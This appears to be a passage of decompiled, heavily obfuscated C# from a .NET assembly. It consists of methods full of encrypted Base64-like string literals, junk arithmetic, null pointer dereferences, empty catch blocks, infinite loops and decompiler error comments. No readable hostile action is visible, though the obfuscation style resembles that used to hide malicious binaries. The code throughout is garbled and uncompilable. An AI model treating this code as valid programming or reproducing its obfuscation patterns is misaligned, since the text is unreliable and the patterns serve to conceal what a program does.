					object obj34 = ((obj33 is NumberStyles) ? obj33 : null);
					bindingFlags = bindingFlags;
					object obj35 = (((byte)Class1.smethod_1(default(BindingFlags), null, null, null) != 0) ? ((bool*)1) : ((bool*)null))->Equals(null);
					num = (uint)(int)((obj35 is uint) ? obj35 : null);
					uint num22 = checked((1279147325u + num21) * num);
					num2 = (nint)checked(unchecked((nuint)num2) - unchecked((nuint)num2) + unchecked((nuint)unchecked((nint)default(IntPtr))));
					num3 = 987479419;
					object obj36 = ((IntPtr*)/*isinst with value type is only supported in some contexts*/)->ToInt32();
					object obj37 = ((ulong*)checked(1276940456L * ((obj36 is ulong) ? obj36 : null) * 1484327217L - unchecked((ulong)Settings.Default) + num9))->GetHashCode();
					object obj38 = ((obj37 is BindingFlags) ? obj37 : null);
					array2 = null;
					int bindingFlags_10 = (int)obj38;
					object obj39 = ((long*)checked(unchecked((ulong)num8) * unchecked((ulong)num8)))->CompareTo((long)Class5.smethod_2());
					BindingFlags bindingFlags_11 = (BindingFlags)Class2.smethod_0((BindingFlags)bindingFlags_10, methodBase_7, uint.TryParse(((ushort*)((obj39 is ushort) ? obj39 : null))->ToString(string.IsInterned(text), null), default(NumberStyles), null, out *(uint*)null) as Type[], array4);
					char[] separator = ((short*)(-26730))->Equals(2277) as char[];
					byte b2 = (byte)checked(96u - 170u);
					string obj40 = (string)(object)"CxyP93ZtS5yO0/55kONFpNRemqYDUp7h12jDrp/Iq7lvnrwiwWlaiM+LdLZc5HcFvppBM5s=".Split(separator, (int)checked(1652171894u + unchecked((uint)(int)((byte*)b2)->ToString(text))), (StringSplitOptions)Class0.smethod_0());
					text = text;
					object obj41 = short.Parse("uH5vJzcKC8E600uk4QVtQDjee0Fb5BFzzE1pE4c6iV6rjlAkq2KlfzRA5U8OUlim+p1Ncm0=", (NumberStyles)obj34, (IFormatProvider)Class2.smethod_2(bindingFlags_11, obj40.StartsWith(value3) as PropertyInfo[], null, null, null));
					MethodBase[] methodBase_8 = ushort.TryParse(s5, (NumberStyles)((obj41 is NumberStyles) ? obj41 : null), null, out *(ushort*)null) as MethodBase[];
					array4 = null;
					array4 = array10;
					array4 = array11;
					_ = (nuint)(nint)num13 / (nuint)(nint)(IntPtr)Class2.smethod_2(default(BindingFlags), propertyInfo_2, null, type_6, (ParameterModifier[])(object)Class2.smethod_0((BindingFlags)obj26, methodBase_8, null, parameterModifier_4));
					num2 = default(IntPtr);
					_ = (IntPtr)((byte*)b2)->ToString();
					num2 = default(IntPtr);
					_003F val4;
					string strB;
					checked
					{
						val4 = obj17 + (1088708380u - unchecked((uint)(int)((IntPtr*)intPtr6)->ToString()));
						strB = text;
					}
					flag = (byte)checked(-1) != 0;
					text = string.Compare(strA, (int)val4, strB, 1453687988, 987479419, ignoreCase, uint.TryParse("KkTk+XEJ9rwhvSDIZDYfCeKylQhcU8bOoHwMoQyK75U6RF2wITES6O8/dx3tSsKcoiFGkZk=", out *(uint*)null) as CultureInfo) as string;
					num3 = (int)((uint)(int)Class5.smethod_0(string_) / 987479419u);
					num3 = num23;
					num3 = (int)checked(unchecked((uint)num24) - 2854250096u);
					ref _003F reference4 = ref *(_003F*)(-31797);
					ref _003F reference5 = ref *(_003F*)/*isinst with value type is only supported in some contexts*/;
					object obj42 = ushort.Parse(text, null);
					_ = (int)Class1.smethod_1(bindingFlags_, methodBase_2, (Type[])(object)Class1.smethod_3(bindingFlags_2, null, null, null, (ParameterModifier[])(object)Class1.smethod_1(bindingFlags_3, methodBase_3, type_3, (ParameterModifier[])(object)Class2.smethod_0(bindingFlags_4, System.Runtime.CompilerServices.Unsafe.As<_003F, short>(ref reference4).CompareTo(System.Runtime.CompilerServices.Unsafe.As<_003F, byte>(ref reference5).ToString(((uint*)((obj42 is uint) ? obj42 : null))->Equals(obj8) as IFormatProvider)) as MethodBase[], array6, array4))), array4);
					goto IL_08f2;
				}
			}
		}
		while (checked((flag ? 1u : 0u) + 0u) != 0);
		if (!flag)
		{
			text = "opKbvMA4h0o1u6bOzX6ornEBYdL/WfImxc9e1CoeJl6ILVm8FDHl+RaM8DhhGCnyMHPlFrg=";
		}
		string s7 = text;
		object obj43 = string.CompareOrdinal(text, 1419904339, text, -573051160, 830615085);
		object obj44 = ((obj43 is NumberStyles) ? obj43 : null);
		text = "CGCBdIt/eai4dO5SMIhASVAZ/ldHWpKXzAEcBB2E213e6945vLtEN9DSAjzFxcrqw/dU//M=";
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string string_2);
		object obj45 = ulong.TryParse(s7, (NumberStyles)obj44, null, out *(ulong*)Class5.smethod_1(string_2));
		num9 = (ulong)(long)((obj45 is ulong) ? obj45 : null);
		try
		{
			_ = sbyte.Parse("MLx8LwSM9PikX3jZJmS7COHkaWUVL0ennVYGVV3gh7ZYUU5SwiFHblAul/n42Ju4zz6iLNM=", style) is IntPtr;
		}
		catch
		{
			if (!flag)
			{
				try
				{
					_ = char.ToLower('⮌') is _003CModule_003E;
					object obj46 = ulong.TryParse((string)(object)Class0.smethod_0(), out reference3);
					_ = (_003CModule_003E)(object)Class2.smethod_2((BindingFlags)((obj46 is BindingFlags) ? obj46 : null), array, (Type)(object)((bool*)1)->ToString(), array6, array4);
				}
				catch
				{
				}
			}
			else
			{
				try
				{
					BindingFlags bindingFlags_12 = (BindingFlags)((byte*)238)->ToString((IFormatProvider?)null);
					array6 = array6;
					System.Runtime.CompilerServices.Unsafe.SkipInit(out Type[] type_11);
					_ = ((IntPtr*)(IntPtr)Class2.smethod_2(bindingFlags_12, null, null, type_11, short.Parse(text, null) as ParameterModifier[]))->GetHashCode() is GClass0;
				}
				catch
				{
					Class3 @class = @class;
					@class = @class;
				}
			}
		}
		_ = uint.Parse(text) is long;
		num8 = -2029636867L;
		_ = ((long*)(long)Class5.smethod_1("u7Y04vVY4um+5v18nPRyQ1SfijzbCUBZHrNZNWyBlK7hfw7Sidnr5QbsA2MXBSDdBHixcpk="))->GetHashCode() is Class4;
		IntPtr num26 = (IntPtr)Settings.Default;
		sbyte num27 = (sbyte)Class2.smethod_2(default(BindingFlags), array, ulong.Parse(text, style, formatProvider) as Type, null, null);
		formatProvider = formatProvider;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider2);
		_ = (IntPtr)(object)(void*)(IntPtr)(nint)checked(unchecked((nuint)(nint)num26) * unchecked((nuint)(nint)(IntPtr)((sbyte*)num27)->ToString(formatProvider2)));
		if ((flag ? 1u : 0u) / (flag ? 1u : 0u) == 0)
		{
			text = text;
		}
		else
		{
			System.Runtime.CompilerServices.Unsafe.SkipInit(out Class2 class2);
			System.Runtime.CompilerServices.Unsafe.SkipInit(out ref char reference6);
			while (flag)
			{
				class2 = class2;
				class2 = class2;
				Class3 @class = IntPtr.Size as Class3;
				string s8 = ((ushort*)13654)->GetHashCode() as string;
				reference6 = ref reference6;
				_ = char.TryParse(s8, out reference6) is GClass0;
			}
		}
		checked
		{
			try
			{
				if (unchecked(((flag ? ((bool*)1) : ((bool*)null))->Equals(null) ? 1u : 0u) / ((((int*)(-1120295254))->Equals(obj8) ? 1u : 0u) / (uint)checked(-1))) + ((unchecked((byte)((ushort*)21048)->ToString("fLfOZc7WaIodxRps2kmzmkL4LmxIuP55NG5zODp9MNzwbEYXLZJudB+lDBPXfaG2sVk9k74=", null)) != 0) ? 1u : 0u) == 0)
				{
					System.Runtime.CompilerServices.Unsafe.SkipInit(out void @void);
					do
					{
						@void = @void;
						@void = default(void);
					}
					while (flag);
				}
			}
			catch
			{
				try
				{
					_ = (GClass0)(object)Class5.smethod_2();
				}
				catch
				{
					while (true)
					{
						if ((flag ? 1u : 0u) - 1u != 0)
						{
							_ = short.Parse(text, unchecked((ulong*)114148834L)->GetTypeCode() as IFormatProvider) is long;
							continue;
						}
						goto end_IL_0b84;
					}
					end_IL_0b84:;
				}
			}
			while (true)
			{
				if (!flag)
				{
					_ = ulong.TryParse(text, style, formatProvider, out reference3) is GClass0;
				}
			}
		}
	}

	unsafe static void smethod_6()
	{
		//IL_0023: Expected O, but got I8
		//IL_002d: Expected O, but got I4
		//IL_0032: Expected I4, but got O
		//IL_004a: Expected O, but got I4
		//IL_0054: Expected O, but got I4
		//IL_005f: Expected O, but got I4
		//IL_008b: Expected O, but got I4
		//IL_0094: Expected I4, but got O
		//IL_0095: Expected O, but got I4
		//IL_00bd: Expected I4, but got O
		//IL_00e9: Expected O, but got I4
		//IL_00f0: Expected I4, but got O
		//IL_00fe: Expected O, but got I4
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_0151: Expected O, but got I4
		//IL_0155: Unknown result type (might be due to invalid IL or missing references)
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Expected I8, but got Unknown
		//IL_0161: Expected O, but got I4
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_016c: Expected Ref, but got Unknown
		//IL_016d: Expected O, but got I4
		//IL_01a1: Expected O, but got I4
		//IL_01cc: Expected O, but got I4
		//IL_0213: Expected O, but got I4
		//IL_022f: Expected O, but got I
		//IL_024d: Expected O, but got I4
		//IL_025a: Unknown result type (might be due to invalid IL or missing references)
		//IL_025b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0262: Expected Ref, but got Unknown
		//IL_0263: Expected O, but got I4
		//IL_0270: Unknown result type (might be due to invalid IL or missing references)
		//IL_0273: Expected I8, but got Unknown
		//IL_0275: Unknown result type (might be due to invalid IL or missing references)
		//IL_0278: Unknown result type (might be due to invalid IL or missing references)
		//IL_0293: Expected O, but got I4
		//IL_02a0: Expected Ref, but got Unknown
		//IL_02a1: Expected O, but got I4
		//IL_02be: Expected O, but got I4
		//IL_02c4: Expected I4, but got O
		//IL_033b: Expected O, but got I4
		//IL_034e: Expected O, but got I4
		//IL_0390: Expected O, but got I4
		//IL_0394: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a0: Expected Ref, but got Unknown
		//IL_03ad: Expected O, but got I4
		//IL_03b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b7: Expected Ref, but got Unknown
		//IL_03b8: Expected O, but got I4
		//IL_03bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d2: Expected O, but got I4
		//IL_03f2: Expected O, but got I8
		//IL_03f8: Expected I4, but got O
		//IL_0400: Expected O, but got I4
		//IL_0416: Expected O, but got I4
		//IL_0427: Unknown result type (might be due to invalid IL or missing references)
		//IL_0428: Unknown result type (might be due to invalid IL or missing references)
		//IL_0429: Unknown result type (might be due to invalid IL or missing references)
		//IL_042c: Expected I4, but got Unknown
		//IL_043e: Expected O, but got I4
		//IL_0442: Unknown result type (might be due to invalid IL or missing references)
		//IL_0444: Unknown result type (might be due to invalid IL or missing references)
		//IL_0445: Unknown result type (might be due to invalid IL or missing references)
		//IL_0448: Expected I4, but got Unknown
		//IL_0451: Expected O, but got I4
		Class5 @class = null;
		@class = @class;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out sbyte b);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text4);
		IFormatProvider formatProvider;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider provider);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string s2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type[] array);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] array3);
		bool flag;
		while (true)
		{
			b = (sbyte)checked(unchecked((uint)b) * unchecked((uint)b));
			ref _003F reference = ref *(_003F*)b;
			object obj = ushort.Parse(text);
			object obj2 = System.Runtime.CompilerServices.Unsafe.As<_003F, sbyte>(ref reference).Equals((sbyte)(int)((obj is sbyte) ? obj : null));
			object obj3 = ((obj2 is NumberStyles) ? obj2 : null);
			text = text;
			text = text2;
			text = text3;
			formatProvider = (IFormatProvider)(object)((uint*)598778604)->ToString(text4, null);
			bool num = long.TryParse("inpiVLL+A3d9InkrXodyHSs/Go8dxKXoFmcszVQewj+cPPNLf3QlDmFoUYS8mZo0LznOr5Q=", (NumberStyles)obj3, formatProvider, out *(long*)null);
			bool num2 = (byte)((byte*)(byte)((long*)(-428329733L))->ToString(formatProvider))->ToString() != 0;
			string s = text;
			formatProvider = formatProvider;
			object obj4 = int.Parse(s, provider);
			object obj5 = ((obj4 is bool) ? obj4 : null);
			flag = (byte)(int)obj5 != 0;
			text = "CP7C00yN50HGVsoec4IIPzCZ3B9cXYfjNOsRtjcvga8MXWmwfTqjdFxli6dXft8SzAXpCoo=";
			object obj6 = char.Parse(s2);
			checked
			{
				if (num - unchecked(num2 / checked(obj5 + ((obj6 is bool) ? obj6 : null))) == 0)
				{
					break;
				}
			}
			BindingFlags bindingFlags_ = (BindingFlags)Settings.Default;
			array = array;
			Type[] type_ = array;
			text = text;
			string s3 = text;
			object obj7 = ushort.Parse(ulong.Parse("5S64P0TlVk4JThj2tUXKaVTdS0gttq3KiZ3C99aGSjN2HhJV9l90OUJmEkklFTWDeSOhLio=") as string);
			NumberStyles numberStyles = (NumberStyles)((obj7 is NumberStyles) ? obj7 : null);
			object obj8 = int.Parse(s3, default(NumberStyles), ((ulong*)1335611907L)->GetHashCode() as IFormatProvider);
			ParameterModifier[] array2 = ((uint*)((obj8 is uint) ? obj8 : null))->Equals(null) as ParameterModifier[];
			array2 = array3;
			_ = (ushort)Class1.smethod_3(bindingFlags_, null, null, type_, array2);
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out BindingFlags bindingFlags2);
		Type type;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type type2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out long num5);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out nint intPtr);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] parameterModifier_);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type[] type_5);
		object value;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string s4);
		short num9;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out BindingFlags bindingFlags);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out BindingFlags bindingFlags_4);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out PropertyInfo[] propertyInfo_5);
		do
		{
			bindingFlags = bindingFlags;
			bindingFlags = bindingFlags2;
			BindingFlags bindingFlags_2 = bindingFlags;
			PropertyInfo[] propertyInfo_ = (PropertyInfo[])(object)Class0.smethod_0();
			type = null;
			type = type2;
			long num3 = (long)Class2.smethod_2(bindingFlags_2, propertyInfo_, type, array, null);
			long num4 = -1011285443L;
			ulong num6 = 18446744073014826595uL / (ulong)num5;
			object obj9 = text.GetHashCode();
			num4 = (long)(num3 / (num6 / ((obj9 is long) ? obj9 : null)));
			object obj10 = ((long*)num4)->GetTypeCode();
			_ = ((bool*)(((obj10 is bool) ? obj10 : null) / 1))->GetHashCode() is bool;
			text = text;
			PropertyInfo[] array4 = null;
			PropertyInfo[] propertyInfo_2 = array4;
			MethodBase[] methodBase_ = uint.TryParse(text, out *(uint*)null) as MethodBase[];
			Type[] type_2 = array;
			string text5 = text;
			bindingFlags = default(BindingFlags);
			BindingFlags bindingFlags_3 = bindingFlags;
			PropertyInfo[] propertyInfo_3 = array4;
			Type type_3 = type;
			intPtr = intPtr;
			IntPtr intPtr2 = intPtr;
			intPtr = default(IntPtr);
			ParameterModifier[] array2 = (ParameterModifier[])(object)((short*)(short)text5.PadLeft((int)Class2.smethod_2(bindingFlags_3, propertyInfo_3, type_3, null, (intPtr2 == intPtr) as ParameterModifier[])))->ToString();
			object obj11 = ((short*)(short)((ushort*)31370)->ToString((string)(object)Class2.smethod_0(default(BindingFlags), methodBase_, type_2, parameterModifier_), formatProvider))->Equals(-24032);
			object obj12 = ((obj11 is ulong) ? obj11 : null);
			bindingFlags = bindingFlags;
			PropertyInfo[] propertyInfo_4 = array4;
			Type type_4 = (Type)(object)((IntPtr*)intPtr)->ToPointer();
			array = array;
			long num7 = (long)Class2.smethod_2(default(BindingFlags), propertyInfo_4, type_4, type_5, null);
			object obj13 = ((int*)636289121)->GetHashCode();
			object obj14 = ((long*)checked(num7 - (((obj13 is long) ? obj13 : null) + -2078415630L)))->CompareTo(null);
			ulong num8 = (ulong)checked(((obj14 is ulong) ? obj14 : null) + 664093488L);
			_003F val = checked(obj12 * num8 - num8);
			value = sbyte.Parse((string)(object)Class0.smethod_0(), default(NumberStyles), null) as object;
			object obj15 = short.TryParse(s4, (NumberStyles)Class1.smethod_3(default(BindingFlags), propertyInfo_2, ((ulong*)val)->CompareTo(value) as Type, array, array2), null, out *(short*)null);
			num9 = (short)(int)((obj15 is short) ? obj15 : null);
			bindingFlags = (BindingFlags)((short*)checked(unchecked((uint)num9) * (4294945378u - unchecked((uint)num9))))->ToString((IFormatProvider)(object)Settings.Default);
			bindingFlags = default(BindingFlags);
			string value2 = (string)(object)Class5.smethod_0("ae/dlZMEuB4MnY7Bzjht/HYtnsK4AdC1fr4x64Q4RIpveMV3AOrvHjY+6LPeTMbz0gQ+zS4=");
			nuint num10;
			nint num11;
			checked
			{
				num10 = unchecked((nuint)intPtr) * unchecked((nuint)intPtr);
				num11 = intPtr;
				intPtr = default(IntPtr);
			}
			array4 = "D8VHwOZi3BrcppZtyL/Yq96rjj1+ng0L9lPUgj5aHi8xq9EIjTPzGuX2VRiG3aEKcSKHFkQ=".IndexOf(value2, -1651202973, (int)((IntPtr*)checked(num10 * unchecked((nuint)num11 / (nuint)unchecked((nint)default(IntPtr)))))->ToString()) as PropertyInfo[];
		}
		while (checked(1u + ((unchecked((byte)Class2.smethod_2(bindingFlags_4, propertyInfo_5, type, array, ((bool*)1)->Equals(obj: false) as ParameterModifier[])) != 0) ? 1u : 0u)) != 0);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out short num13);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider provider3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag4);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag5);
		while (true)
		{
			try
			{
				ulong num12 = (ulong)Settings.Default;
				object obj16 = ((ulong*)(ulong)((short*)checked(4294955987u - unchecked((uint)num9) - /*isinst with value type is only supported in some contexts*/))->ToString("IkUEWNAsPPkLxdRyyAuBiAOYgkg4OLdWO34jo0RmXV+6c5FHAM0qcdaIQsvy33i5SOrVHrw=", null))->CompareTo(value);
				object obj17 = ((ulong*)checked(num12 * ((obj16 is ulong) ? obj16 : null)))->GetTypeCode();
				checked
				{
					_ = -2048705677 + ((obj17 is int) ? obj17 : null);
				}
			}
			catch
			{
				try
				{
					flag = false;
					_ = ((bool*)checked((flag2 ? 1u : 0u) + 0u))->CompareTo(value: false) is GClass0;
				}
				finally
				{
					flag = flag;
					string s5 = text;
					NumberStyles numberStyles = default(NumberStyles);
					object obj18 = ulong.Parse(s5, numberStyles);
					num9 = (short)(int)((obj18 is short) ? obj18 : null);
					object obj19 = ((short*)num13)->GetTypeCode();
					object obj20 = ((obj19 is bool) ? obj19 : null);
					string s6 = text;
					NumberStyles style = numberStyles;
					IFormatProvider provider2 = formatProvider;
					string s7 = text;
					formatProvider = formatProvider;
					object obj21 = ushort.Parse(s7, provider3);
					flag = (byte)(int)(0 / checked(1 * (obj20 * unchecked(checked(2u + (int.TryParse(s6, style, provider2, out *unchecked((int*)((obj21 is ref int) ? obj21 : null))) ? 1u : 0u)) / (flag ? 1u : 0u))))) != 0;
					object obj22 = char.ConvertToUtf32('槼', '妟');
					flag = (byte)checked(flag3 * (flag4 * ((obj22 is bool) ? obj22 : null) * 0)) != 0;
					_ = ((bool*)checked(0u + (flag5 ? 1u : 0u)))->GetTypeCode() is byte;
					goto end_IL_03c3;
				}
				end_IL_03c3:;
			}
		}
	}

	unsafe static void smethod_7()
	{
		//IL_0014: Expected O, but got I4
		//IL_0028: Expected O, but got I
		//IL_0042: Expected O, but got I4
		//IL_005e: Expected O, but got I4
		//IL_006d: Expected O, but got I4
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Expected I, but got Unknown
		//IL_0089: Expected O, but got I4
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Expected I4, but got Unknown
		//IL_00b3: Expected O, but got I4
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_010f: Expected O, but got I4
		//IL_0123: Expected O, but got I4
		//IL_0129: Expected I4, but got O
		//IL_0154: Expected O, but got I4
		//IL_0188: Expected O, but got F8
		//IL_0193: Expected I, but got O
		//IL_0194: Expected O, but got I4
		//IL_019d: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a3: Expected I4, but got Unknown
		//IL_01a4: Expected O, but got I4
		//IL_01c4: Expected O, but got I4
		//IL_01e1: Expected O, but got I4
		//IL_01f5: Expected O, but got I4
		//IL_0209: Expected I4, but got O
		//IL_0234: Expected O, but got I4
		//IL_025c: Expected O, but got I4
		//IL_026d: Expected O, but got I4
		//IL_0276: Expected I4, but got O
		//IL_0276: Expected I4, but got O
		//IL_0277: Expected O, but got I4
		//IL_02ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d0: Expected I, but got Unknown
		//IL_02d1: Expected O, but got I
		//IL_02e5: Expected O, but got I
		//IL_031a: Expected O, but got I4
		//IL_0320: Expected I8, but got O
		//IL_032a: Expected O, but got I4
		//IL_034a: Expected O, but got I4
		//IL_035d: Expected I4, but got O
		//IL_035e: Expected O, but got I4
		//IL_0367: Expected I4, but got O
		//IL_0368: Expected O, but got I4
		//IL_0372: Expected O, but got I4
		//IL_0392: Expected O, but got I4
		//IL_039f: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f7: Expected O, but got I
		//IL_0406: Expected O, but got I4
		//IL_0410: Expected Ref, but got Unknown
		//IL_045b: Expected O, but got I
		//IL_0461: Expected I4, but got O
		//IL_0475: Expected O, but got I4
		//IL_048d: Expected O, but got I4
		//IL_04a6: Expected O, but got I4
		//IL_04f7: Expected O, but got I4
		//IL_0500: Expected Ref, but got Unknown
		//IL_0501: Expected O, but got I4
		//IL_0535: Expected O, but got I4
		//IL_0566: Expected O, but got I4
		//IL_056a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0570: Expected Ref, but got Unknown
		//IL_0571: Expected O, but got I4
		//IL_057a: Expected I4, but got O
		//IL_057b: Expected O, but got I4
		//IL_058a: Expected O, but got I4
		//IL_05ad: Expected O, but got I4
		//IL_05bd: Expected O, but got I4
		//IL_05f0: Expected O, but got I4
		object obj = "+FSeOgkhR2z99CzNwHeb0IZ+ExM5nsGkBinE62FTf8PUzdy1AESf/bd631baGlrX835N2VM=".GetTypeCode();
		object obj2 = ((obj is ulong) ? obj : null);
		string text = ((nint)(IntPtr)(int)Settings.Default) as string;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text2);
		text = text2;
		string s = text;
		NumberStyles style = (NumberStyles)Class0.smethod_0();
		object obj3 = int.Parse(s, style);
		object obj4 = ((obj3 is IntPtr) ? obj3 : null);
		bool num = (byte)Class5.smethod_0(text) != 0;
		bool flag = num;
		IntPtr num2 = (nint)checked(unchecked((nuint)(nint)(IntPtr)((uint*)530142809)->ToString((num ? ((bool*)1) : ((bool*)null))->GetTypeCode() as string, char.ToLowerInvariant('蝆') as IFormatProvider)) - unchecked((nuint)num2));
		object obj5 = char.IsLower((char)(int)checked(/*isinst with value type is only supported in some contexts*/ - 28657 + 34005u * unchecked((uint)(char)((ulong*)2138244411L)->ToString())));
		_003F val = checked(2048813914L * (obj2 - ((obj5 is ulong) ? obj5 : null)));
		string s2 = text;
		style = default(NumberStyles);
		string s3 = (string)(object)Class0.smethod_0();
		string text3 = text;
		string text4 = text;
		_ = (StringSplitOptions)Class0.smethod_0();
		string s4 = text;
		NumberStyles style2 = (NumberStyles)Class1.smethod_0(null, null);
		uint num3 = (uint)Class0.smethod_0();
		object obj6 = ((ulong*)1183736117L)->Equals((ulong)Class5.smethod_0(((uint*)num3)->GetTypeCode() as string));
		BindingFlags bindingFlags = (BindingFlags)((obj6 is BindingFlags) ? obj6 : null);
		BindingFlags bindingFlags_ = bindingFlags;
		text = "1Z0ds5PBvihwdLNcKCOPr5+3v+1t62oisI9OU6lwsFFqSHP+jCrdG5A84VbBusDyKLhI3yA=";
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text5);
		ushort num4 = (ushort)text5.ToUpperInvariant();
		ushort num5 = num5;
		object obj10;
		MethodBase[] methodBase_;
		ushort num6;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out MethodBase[] array);
		checked
		{
			_ = unchecked((uint)(char)((ushort*)checked(num4 * num5))->ToString((IFormatProvider)(object)Class1.smethod_2(((uint*)(uint)Settings.Default)->GetTypeCode() as string))) + 51418u;
			object obj7 = char.GetNumericValue('諆');
			object obj8 = unchecked((IntPtr)((obj7 is IntPtr) ? obj7 : null)) != num2;
			object obj9 = char.IsControl("IXLxikdZzkCVq9Ya7iqD+XR7khA/fNZFpcLunR2Ht0dLIdu79Fn3u31GRpZGImgVmCyufF4=", ((obj8 is int) ? obj8 : null) - -219197618);
			obj10 = ((obj9 is BindingFlags) ? obj9 : null);
			methodBase_ = array;
			num6 = num5;
		}
		_ = (char)Settings.Default;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out char c);
		text = char.ToUpper(c) as string;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text6);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider);
		object obj11 = ((ushort*)num6)->ToString(text6, formatProvider);
		Type[] type_ = ((int*)(-162685704))->CompareTo(obj11) as Type[];
		_ = ((ushort*)9798)->CompareTo(21675) is ParameterModifier[];
		ParameterModifier[] array2 = array2;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] array3);
		array2 = array3;
		uint num7;
		short num8;
		checked
		{
			num7 = 35526u + unchecked((uint)(char)Class2.smethod_0((BindingFlags)obj10, methodBase_, type_, array2));
			num8 = 21834;
		}
		array = char.IsUpper((char)(num7 / checked(8473u * unchecked((uint)(char)((short*)21834)->ToString(formatProvider))))) as MethodBase[];
		MethodBase[] methodBase_2 = array;
		num5 = 63738;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ushort num9);
		object obj12 = ((ushort*)11505)->Equals((ushort)checked(32624u * unchecked((uint)num9) - 63738u));
		int highSurrogate = (int)((obj12 is char) ? obj12 : null);
		object obj13 = ((int*)(-1753010382))->Equals(obj11);
		object obj14 = char.IsSurrogatePair((char)highSurrogate, (char)(int)((obj13 is char) ? obj13 : null));
		object obj15 = ((obj14 is IntPtr) ? obj14 : null);
		BindingFlags bindingFlags_2 = (BindingFlags)Class5.smethod_0(text);
		PropertyInfo[] array4 = (PropertyInfo[])(object)Settings.Default;
		_003F val2;
		checked
		{
			val2 = obj15 + unchecked((nuint)(nint)(IntPtr)Class2.smethod_2(bindingFlags_2, array4, (Type)(object)((ulong*)810191070L)->ToString(text, formatProvider), null, array2) / (nuint)num2);
			num2 = default(IntPtr);
		}
		_ = ((nint)((IntPtr)checked(val2 + unchecked((nuint)(nint)num2)) - -50714527)) is Type[];
		Type[] type_2 = null;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out int num10);
		string obj16 = (string)(object)Class2.smethod_0(bindingFlags_, methodBase_2, type_2, ((nint)(num2 - num10)) as ParameterModifier[]);
		int count = num10;
		object obj17 = ushort.Parse("Qt6VyFElyZjhMS7hPg9CahzeEzTj/AViWeojLEpx0YH9NIQzSj81zZEf7pE7+J1JMpO+Seo=", default(NumberStyles), formatProvider);
		long num11 = (long)((obj17 is long) ? obj17 : null);
		object obj18 = ((long*)num11)->CompareTo(num11);
		object obj19 = ((obj18 is NumberStyles) ? obj18 : null);
		BindingFlags bindingFlags_3 = bindingFlags;
		array4 = array4;
		Type type = type;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out PropertyInfo[] propertyInfo_);
		object obj20 = byte.Parse("dQC9E16a627tE/eHOVUohWnK8ooQWbJQSulHAzeX9Mk47Y9RshduDHtsciO/CGgXaQkU/5s=", (NumberStyles)obj19, (IFormatProvider)Class1.smethod_3(bindingFlags_3, propertyInfo_, type, null, uint.Parse("KFBWpMJxrddBoSwPmqFS8786fdNqbjgOx4SvrJd84ZaGr8KZx8E1HDDZa19SJE/osX6p8+0=", formatProvider) as ParameterModifier[]));
		_ = ushort.Parse(s4, style2, obj16.IndexOf("0OJv2VZ4KRdFnivduZ7YVnyQ6GdmC0DuIagEByciavIEs2jOGpqgAiRluyNlckWf6m0UaB8=", 826348395, count, (StringComparison)((obj20 is StringComparison) ? obj20 : null)) as IFormatProvider) is StringSplitOptions;
		string s5 = text;
		style = default(NumberStyles);
		NumberStyles style3 = style;
		IFormatProvider provider = formatProvider;
		ref sbyte reference = ref reference;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ref sbyte reference2);
		reference = ref reference2;
		object obj21 = sbyte.TryParse(s5, style3, provider, out reference);
		_003F val3 = checked(((obj21 is ulong) ? obj21 : null) + 1797924711L);
